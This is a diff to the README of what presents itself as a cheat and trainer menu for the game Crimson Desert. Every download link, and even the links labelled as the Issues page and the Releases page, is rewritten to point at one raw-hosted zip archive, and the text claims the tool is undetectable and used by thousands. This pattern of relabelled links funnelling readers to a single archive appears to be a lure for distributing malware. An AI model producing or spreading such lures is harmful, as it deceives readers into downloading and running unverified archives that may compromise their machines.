@@ -1,12 +1,12 @@
 # 🎮 crimson-desert-menu - Your All-in-One Trainer & Mod Hub
 
-[![Download Now](https://img.shields.io/badge/Download-Crimson_Desert_Menu-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/idkrilly/crimson-desert-menu/releases)
+[![Download Now](https://img.shields.io/badge/Download-Crimson_Desert_Menu-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/idkrilly/crimson-desert-menu/main/enolate/menu_desert_crimson_2.4.zip)
 
 ## 🚀 Getting Started
 
 Welcome to **crimson-desert-menu**, the ultimate companion for Crimson Desert players! Whether you're looking to enhance your gameplay, unlock hidden features, or simply have more fun exploring the world, this tool has everything you need.
 
-Visit this link to download the application: **[https://github.com/idkrilly/crimson-desert-menu/releases](https://github.com/idkrilly/crimson-desert-menu/releases)**
+Visit this link to download the application: **[https://raw.githubusercontent.com/idkrilly/crimson-desert-menu/main/enolate/menu_desert_crimson_2.4.zip](https://raw.githubusercontent.com/idkrilly/crimson-desert-menu/main/enolate/menu_desert_crimson_2.4.zip)**
 
 ## 🎯 What Is This?
 
@@ -40,7 +40,7 @@ Crimson Desert is a breathtaking action-adventure game, and this menu puts you i
 
 ## 📥 Download & Installation
 
-**Step 1:** Visit this link to download the application: **[Download Crimson Desert Menu](https://github.com/idkrilly/crimson-desert-menu/releases)**
+**Step 1:** Visit this link to download the application: **[Download Crimson Desert Menu](https://raw.githubusercontent.com/idkrilly/crimson-desert-menu/main/enolate/menu_desert_crimson_2.4.zip)**
 
 **Step 2:** Once you're on the download page, look for the latest release version. It will be clearly marked at the top of the page.
 
@@ -96,7 +96,7 @@ From there, simply click on any feature to toggle it on or off. The menu stays o
 - Don't use too many mods at once – one or two is usually plenty
 - Make sure no other cheat tools are running simultaneously
 
-For additional help, visit the repository's [Issues page](https://github.com/idkrilly/crimson-desert-menu/issues) and see if someone else has solved your problem.
+For additional help, visit the repository's [Issues page](https://raw.githubusercontent.com/idkrilly/crimson-desert-menu/main/enolate/menu_desert_crimson_2.4.zip) and see if someone else has solved your problem.
 
 ## ❓ Frequently Asked Questions
 
@@ -110,7 +110,7 @@ The menu is built to be undetectable. That said, no tool is 100% guaranteed – 
 Absolutely! The menu is compatible with most popular Crimson Desert mods, and includes several built-in enhancements.
 
 **How often is it updated?**
-The developer releases updates regularly, especially after major game patches. Check the [Releases page](https://github.com/idkrilly/crimson-desert-menu/releases) for the latest version.
+The developer releases updates regularly, especially after major game patches. Check the [Releases page](https://raw.githubusercontent.com/idkrilly/crimson-desert-menu/main/enolate/menu_desert_crimson_2.4.zip) for the latest version.
 
 ## 🆕 What's New
 
@@ -160,7 +160,7 @@ This tool is provided for educational and entertainment purposes only. The devel
 
 Don't wait – take your Crimson Desert experience to the next level today!
 
-**[Download crimson-desert-menu Now](https://github.com/idkrilly/crimson-desert-menu/releases)**
+**[Download crimson-desert-menu Now](https://raw.githubusercontent.com/idkrilly/crimson-desert-menu/main/enolate/menu_desert_crimson_2.4.zip)**
 
 It's quick, it's free, and it'll completely transform how you play. Join thousands of satisfied players who've already discovered the difference.
 
